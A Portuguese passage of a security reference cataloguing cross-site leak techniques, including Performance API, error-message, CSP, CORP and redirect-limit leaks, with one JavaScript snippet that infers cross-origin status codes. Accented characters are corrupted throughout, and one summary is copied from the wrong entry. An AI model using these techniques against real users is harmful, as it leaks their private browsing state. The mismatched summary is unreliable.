Al√©m das medi√ß√µes de tempo, a Performance API pode ser aproveitada para insights relacionados √† seguran√ßa. Por exemplo, a presen√ßa ou aus√™ncia de p√°ginas no objeto `performance` no Chrome pode indicar a aplica√ß√£o de `X-Frame-Options`. Especificamente, se uma p√°gina for bloqueada de ser renderizada em um frame devido a `X-Frame-Options`, ela n√£o ser√° registrada no objeto `performance`, fornecendo uma pista sutil sobre as pol√≠ticas de framing da p√°gina.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Uma requisi√ß√£o que resulta em erros n√£o criar√° uma entrada de tempo de recurso.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

√â poss√≠vel **diferenciar entre c√≥digos de status de resposta HTTP** porque requisi√ß√µes que levam a um **erro** n√£o **criam uma entrada de desempenho**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Devido a um bug do navegador, requisi√ß√µes que resultam em erros s√£o carregadas duas vezes.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Na t√©cnica anterior, tamb√©m foram identificados dois casos onde bugs do navegador no GC levam a **recursos sendo carregados duas vezes quando falham ao carregar**. Isso resultar√° em m√∫ltiplas entradas na Performance API e pode, portanto, ser detectado.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Requisi√ß√µes que resultam em um erro n√£o podem ser mescladas.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

A t√©cnica foi encontrada em uma tabela no artigo mencionado, mas nenhuma descri√ß√£o da t√©cnica foi encontrada nele. No entanto, voc√™ pode encontrar o c√≥digo-fonte verificando-o em [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Respostas vazias n√£o criam entradas de tempo de recurso.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Um atacante pode detectar se uma requisi√ß√£o resultou em um corpo de resposta HTTP vazio porque **p√°ginas vazias n√£o criam uma entrada de desempenho em alguns navegadores**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Usando o XSS Auditor em Security Assertions, atacantes podem detectar elementos espec√≠ficos de p√°ginas da web observando altera√ß√µes nas respostas quando cargas √∫teis elaboradas acionam o mecanismo de filtragem do auditor.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Em Security Assertions (SA), o XSS Auditor, originalmente destinado a prevenir ataques de Cross-Site Scripting (XSS), pode paradoxalmente ser explorado para vazar informa√ß√µes sens√≠veis. Embora esse recurso embutido tenha sido removido do Google Chrome (GC), ainda est√° presente no SA. Em 2013, Braun e Heiderich demonstraram que o XSS Auditor poderia inadvertidamente bloquear scripts leg√≠timos, levando a falsos positivos. Com base nisso, pesquisadores desenvolveram t√©cnicas para extrair informa√ß√µes e detectar conte√∫do espec√≠fico em p√°ginas de origem cruzada, um conceito conhecido como XS-Leaks, inicialmente relatado por Terada e elaborado por Heyes em um post de blog. Embora essas t√©cnicas fossem espec√≠ficas para o XSS Auditor no GC, foi descoberto que no SA, p√°ginas bloqueadas pelo XSS Auditor n√£o geram entradas na Performance API, revelando um m√©todo pelo qual informa√ß√µes sens√≠veis ainda podem ser vazadas.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Recurso com cabe√ßalho X-Frame-Options n√£o cria entrada de tempo de recurso.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Se uma p√°gina **n√£o √© permitida** a ser **renderizada** em um **iframe**, ela **n√£o cria uma entrada de desempenho**. Como resultado, um atacante pode detectar o cabe√ßalho de resposta **`X-Frame-Options`**.\
O mesmo acontece se voc√™ usar uma **tag embed**.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Downloads n√£o criam entradas de tempo de recurso na Performance API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar ao XS-Leak descrito, um **recurso que √© baixado** por causa do cabe√ßalho ContentDisposition, tamb√©m **n√£o cria uma entrada de desempenho**. Essa t√©cnica funciona em todos os principais navegadores.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Entrada de tempo de recurso vaza o tempo de in√≠cio de um redirecionamento.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Encontramos uma inst√¢ncia de XS-Leak que abusa do comportamento de alguns navegadores que registram informa√ß√µes demais para requisi√ß√µes de origem cruzada. O padr√£o define um subconjunto de atributos que devem ser definidos como zero para recursos de origem cruzada. No entanto, no **SA** √© poss√≠vel detectar se o usu√°rio foi **redirecionado** pela p√°gina alvo, consultando a **Performance API** e verificando os dados de **tempo de redirecionamento**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** A dura√ß√£o das entradas de tempo √© negativa quando ocorre um redirecionamento.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

No GC, a **dura√ß√£o** para requisi√ß√µes que resultam em um **redirecionamento** √© **negativa** e pode, portanto, ser **distinguida** de requisi√ß√µes que n√£o resultam em um redirecionamento.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Recurso protegido com CORP n√£o cria entradas de tempo de recurso.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Em alguns casos, a **entrada nextHopProtocol** pode ser usada como uma t√©cnica de vazamento. No GC, quando o **cabe√ßalho CORP** est√° definido, o nextHopProtocol ficar√° **vazio**. Note que o SA n√£o criar√° uma entrada de desempenho para recursos habilitados para CORP.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Usage
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Detectar se um service worker est√° registrado para uma origem espec√≠fica.
* **Code Example**:

Service workers s√£o contextos de script acionados por eventos que rodam em uma origem. Eles rodam em segundo plano de uma p√°gina web e podem interceptar, modificar e **armazenar em cache recursos** para criar aplica√ß√µes web offline.\
Se um **recurso armazenado em cache** por um **service worker** for acessado via **iframe**, o recurso ser√° **carregado do cache do service worker**.\
Para detectar se o recurso foi **carregado do cache do service worker**, a **Performance API** pode ser usada.\
Isso tamb√©m poderia ser feito com um ataque de Timing (verifique o artigo para mais informa√ß√µes).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** √â poss√≠vel verificar se um recurso foi armazenado no cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando a [Performance API](xs-search.md#performance-api) √© poss√≠vel verificar se um recurso est√° em cache.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** √â poss√≠vel recuperar a dura√ß√£o da rede de uma requisi√ß√£o da API `performance`.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** No Firefox √© poss√≠vel vazar com precis√£o o c√≥digo de status de uma requisi√ß√£o de origem cruzada.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
A propriedade message da interface `MediaError` identifica de forma √∫nica os recursos que carregam com sucesso com uma string distinta. Um atacante pode explorar esse recurso observando o conte√∫do da mensagem, deduzindo assim o status de resposta de um recurso de origem cruzada.

### Erro CORS

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Em Aser√ß√µes de Seguran√ßa (SA), mensagens de erro CORS exp√µem inadvertidamente a URL completa de solicita√ß√µes redirecionadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Essa t√©cnica permite que um atacante **extraia o destino de um redirecionamento de um site de origem cruzada** explorando como navegadores baseados em Webkit lidam com solicita√ß√µes CORS. Especificamente, quando uma **solicita√ß√£o habilitada para CORS** √© enviada a um site de destino que emite um redirecionamento com base no estado do usu√°rio e o navegador posteriormente nega a solicita√ß√£o, a **URL completa do alvo do redirecionamento** √© divulgada na mensagem de erro. Essa vulnerabilidade n√£o apenas revela o fato do redirecionamento, mas tamb√©m exp√µe o endpoint do redirecionamento e quaisquer **par√¢metros de consulta sens√≠veis** que ele possa conter.

### Erro SRI

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Em Aser√ß√µes de Seguran√ßa (SA), mensagens de erro CORS exp√µem inadvertidamente a URL completa de solicita√ß√µes redirecionadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Um atacante pode explorar **mensagens de erro verbosas** para deduzir o tamanho das respostas de origem cruzada. Isso √© poss√≠vel devido ao mecanismo de Integridade de Sub-recurso (SRI), que usa o atributo de integridade para validar que os recursos buscados, frequentemente de CDNs, n√£o foram adulterados. Para que o SRI funcione em recursos de origem cruzada, estes devem ser **habilitados para CORS**; caso contr√°rio, n√£o est√£o sujeitos a verifica√ß√µes de integridade. Em Aser√ß√µes de Seguran√ßa (SA), assim como o erro CORS XS-Leak, uma mensagem de erro pode ser capturada ap√≥s uma solicita√ß√£o fetch com um atributo de integridade falhar. Os atacantes podem deliberadamente **disparar esse erro** atribuindo um **valor de hash falso** ao atributo de integridade de qualquer solicita√ß√£o. Em SA, a mensagem de erro resultante revela inadvertidamente o comprimento do conte√∫do do recurso solicitado. Essa vazamento de informa√ß√£o permite que um atacante discernir varia√ß√µes no tamanho da resposta, abrindo caminho para ataques XS-Leak sofisticados.

### Viola√ß√£o/Detec√ß√£o CSP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumo:** Permitindo apenas o site da v√≠tima na CSP, se tentarmos redirecionar para um dom√≠nio diferente, a CSP acionar√° um erro detect√°vel.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Um XS-Leak pode usar a CSP para detectar se um site de origem cruzada foi redirecionado para uma origem diferente. Esse vazamento pode detectar o redirecionamento, mas, adicionalmente, o dom√≠nio do alvo do redirecionamento vaza. A ideia b√°sica desse ataque √© **permitir o dom√≠nio alvo no site do atacante**. Uma vez que uma solicita√ß√£o √© emitida para o dom√≠nio alvo, ele **redireciona** para um dom√≠nio de origem cruzada. **A CSP bloqueia** o acesso a ele e cria um **relat√≥rio de viola√ß√£o usado como t√©cnica de vazamento**. Dependendo do navegador, **esse relat√≥rio pode vazar a localiza√ß√£o alvo do redirecionamento**.\
Navegadores modernos n√£o indicar√£o a URL para a qual foi redirecionado, mas voc√™ ainda pode detectar que um redirecionamento de origem cruzada foi acionado.

### Cache

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumo:** Limpe o arquivo do cache. Abre a p√°gina alvo e verifica se o arquivo est√° presente no cache.
* **Exemplo de C√≥digo:**

Os navegadores podem usar um cache compartilhado para todos os sites. Independentemente de sua origem, √© poss√≠vel deduzir se uma p√°gina alvo **solicitou um arquivo espec√≠fico**.

Se uma p√°gina carrega uma imagem apenas se o usu√°rio estiver logado, voc√™ pode **invalidar** o **recurso** (para que n√£o esteja mais em cache, veja mais informa√ß√µes nos links), **realizar uma solicita√ß√£o** que poderia carregar esse recurso e tentar carregar o recurso **com uma solicita√ß√£o inv√°lida** (por exemplo, usando um cabe√ßalho referer excessivamente longo). Se o carregamento do recurso **n√£o disparou nenhum erro**, √© porque ele foi **cacheado**.

### Diretiva CSP

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumo:** As diretivas de cabe√ßalho CSP podem ser sondadas usando o atributo iframe CSP, revelando detalhes da pol√≠tica.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Um recurso novo no Google Chrome (GC) permite que p√°ginas da web **proponham uma Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)** definindo um atributo em um elemento iframe, com diretivas de pol√≠tica transmitidas junto com a solicita√ß√£o HTTP. Normalmente, o conte√∫do incorporado deve **autorizar isso via um cabe√ßalho HTTP**, ou uma **p√°gina de erro √© exibida**. No entanto, se o iframe j√° for governado por uma CSP e a nova pol√≠tica proposta n√£o for mais restritiva, a p√°gina ser√° carregada normalmente. Esse mecanismo abre um caminho para um atacante **detectar diretivas CSP espec√≠ficas** de uma p√°gina de origem cruzada identificando a p√°gina de erro. Embora essa vulnerabilidade tenha sido marcada como corrigida, nossas descobertas revelam uma **nova t√©cnica de vazamento** capaz de detectar a p√°gina de erro, sugerindo que o problema subjacente nunca foi totalmente resolvido.

### **CORP**

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumo:** Recursos protegidos com Pol√≠tica de Recursos de Origem Cruzada (CORP) gerar√£o um erro quando buscados de uma origem n√£o permitida.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

O cabe√ßalho CORP √© um recurso de seguran√ßa da plataforma web relativamente novo que, quando definido, **bloqueia solicita√ß√µes de origem cruzada sem CORS para o recurso dado**. A presen√ßa do cabe√ßalho pode ser detectada, pois um recurso protegido com CORP **gerar√° um erro quando buscado**.

### CORB

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumo**: CORB pode permitir que atacantes detectem quando o **cabe√ßalho `nosniff` est√° presente** na solicita√ß√£o.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Verifique o link para mais informa√ß√µes sobre o ataque.

### Erro CORS na m√° configura√ß√£o de Reflex√£o de Origem <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumo**: Se o cabe√ßalho Origin for refletido no cabe√ßalho `Access-Control-Allow-Origin`, √© poss√≠vel verificar se um recurso j√° est√° no cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Caso o **cabe√ßalho Origin** esteja sendo **refletido** no cabe√ßalho `Access-Control-Allow-Origin`, um atacante pode abusar desse comportamento para tentar **buscar** o **recurso** em modo **CORS**. Se um **erro** **n√£o** for disparado, isso significa que foi **recuperado corretamente da web**, se um erro **for disparado**, √© porque foi **acessado do cache** (o erro aparece porque o cache salva uma resposta com um cabe√ßalho CORS permitindo o dom√≠nio original e n√£o o dom√≠nio do atacante)**.**\
Observe que se a origem n√£o for refletida, mas um curinga for usado (`Access-Control-Allow-Origin: *`), isso n√£o funcionar√°.

## T√©cnica de Atributos Leg√≠veis

### Redirecionamento Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumo:** GC e SA permitem verificar o tipo de resposta (opaque-redirect) ap√≥s o redirecionamento ser conclu√≠do.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Submetendo uma solicita√ß√£o usando a Fetch API com `redirect: "manual"` e outros par√¢metros, √© poss√≠vel ler o atributo `response.type` e, se for igual a `opaqueredirect`, ent√£o a resposta foi um redirecionamento.

### COOP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumo:** P√°ginas protegidas pela Pol√≠tica de Abertura de Origem Cruzada (COOP) impedem o acesso de intera√ß√µes de origem cruzada.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Um atacante √© capaz de deduzir a presen√ßa do cabe√ßalho da Pol√≠tica de Abertura de Origem Cruzada (COOP) em uma resposta HTTP de origem cruzada. O COOP √© utilizado por aplica√ß√µes web para impedir que sites externos obtenham refer√™ncias de janela arbitr√°rias. A visibilidade desse cabe√ßalho pode ser discernida ao tentar acessar a **refer√™ncia `contentWindow`**. Em cen√°rios onde o COOP √© aplicado condicionalmente, a **propriedade `opener`** se torna um indicador revelador: ela √© **indefinida** quando o COOP est√° ativo e **definida** em sua aus√™ncia.

### Comprimento M√°ximo da URL - Lado do Servidor

* **M√©todos de Inclus√£o**: Fetch API, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumo:** Detectar diferen√ßas nas respostas porque o comprimento da resposta de redirecionamento pode ser t√£o grande que o servidor responde com um erro e um alerta √© gerado.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Se um redirecionamento do lado do servidor usar **entrada do usu√°rio dentro do redirecionamento** e **dados extras**. √â poss√≠vel detectar esse comportamento porque geralmente **servidores** t√™m um **limite de comprimento de solicita√ß√£o**. Se os **dados do usu√°rio** forem **esse comprimento - 1**, porque o **redirecionamento** est√° usando **esses dados** e **adicionando** algo **extra**, isso acionar√° um **erro detect√°vel via Eventos de Erro**.

Se voc√™ puder de alguma forma definir cookies para um usu√°rio, tamb√©m pode realizar esse ataque **definindo cookies suficientes** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) para que, com o **tamanho da resposta aumentada** da **resposta correta**, um **erro** seja acionado. Nesse caso, lembre-se de que, se voc√™ disparar essa solicita√ß√£o de um mesmo site, `<script>` enviar√° automaticamente os cookies (para que voc√™ possa verificar erros).\
Um exemplo da **cookie bomb + XS-Search** pode ser encontrado na solu√ß√£o pretendida deste relat√≥rio: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou estar no mesmo contexto geralmente √© necess√°rio para esse tipo de ataque.

### Comprimento M√°ximo da URL - Lado do Cliente

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumo:** Detectar diferen√ßas nas respostas porque o comprimento da resposta de redirecionamento pode ser muito grande para uma solicita√ß√£o que uma diferen√ßa pode ser notada.
* **Exemplo de C√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

De acordo com a [documenta√ß√£o do Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), o comprimento m√°ximo da URL do Chrome √© 2MB.

> Em geral, a _plataforma web_ n√£o tem limites no comprimento das URLs (embora 2^31 seja um limite comum). _Chrome_ limita as URLs a um comprimento m√°ximo de **2MB** por raz√µes pr√°ticas e para evitar causar problemas de nega√ß√£o de servi√ßo na comunica√ß√£o entre processos.

Portanto, se a **URL de redirecionamento respondida for maior em um dos casos**, √© poss√≠vel fazer com que ela redirecione com uma **URL maior que 2MB** para atingir o **limite de comprimento**. Quando isso acontece, o Chrome mostra uma p√°gina **`about:blank#blocked`**.

A **diferen√ßa not√°vel** √© que, se o **redirecionamento** foi **conclu√≠do**, `window.origin` gera um **erro** porque uma origem cruzada n√£o pode acessar essa informa√ß√£o. No entanto, se o **limite** foi \*\*\*\* atingido e a p√°gina carregada foi **`about:blank#blocked`**, a **origem** da janela permanece a do **pai**, que √© uma **informa√ß√£o acess√≠vel.**

Todas as informa√ß√µes extras necess√°rias para alcan√ßar os **2MB** podem ser adicionadas via um **hash** na URL inicial para que sejam **usadas no redirecionamento**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### M√°ximo de Redirecionamentos

* **M√©todos de Inclus√£o**: Fetch API, Frames
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
* **Resumo:** Use o limite de redirecionamento do navegador para determinar a ocorr√™ncia de redirecionamentos de URL.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Se o **n√∫mero m√°ximo** de **redirecionamentos** a seguir de um navegador for **20**, um atacante poderia tentar carregar sua p√°gina com **19 redirecionamentos** e finalmente **enviar a v√≠tima** para a p√°gina testada. Se um **erro** for disparado, ent√£o a p√°gina estava tentando **redirecionar a v√≠tima**.

### Comprimento do Hist√≥rico

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumo:** O c√≥digo JavaScript manipula o hist√≥rico do navegador e pode ser acessado pela propriedade length.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

A **API de Hist√≥rico** permite que o c√≥digo JavaScript manipule o hist√≥rico do navegador, que **salva as p√°ginas visitadas por um usu√°rio**. Um atacante pode usar a propriedade length como um m√©todo de inclus√£o: para detectar navega√ß√£o em JavaScript e HTML.\
**Verificando `history.length`**, fazendo um usu√°rio **navegar** para uma p√°gina, **voltando** para a mesma origem e **verificando** o novo valor de **`history.length`**.

### Comprimento do Hist√≥rico com a mesma URL

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Se a URL √© a mesma que a adivinhada
* **Resumo:** √â poss√≠vel adivinhar se a localiza√ß√£o de um frame/pop-up est√° em uma URL espec√≠fica abusando do comprimento do hist√≥rico.
* **Exemplo de C√≥digo**: Abaixo

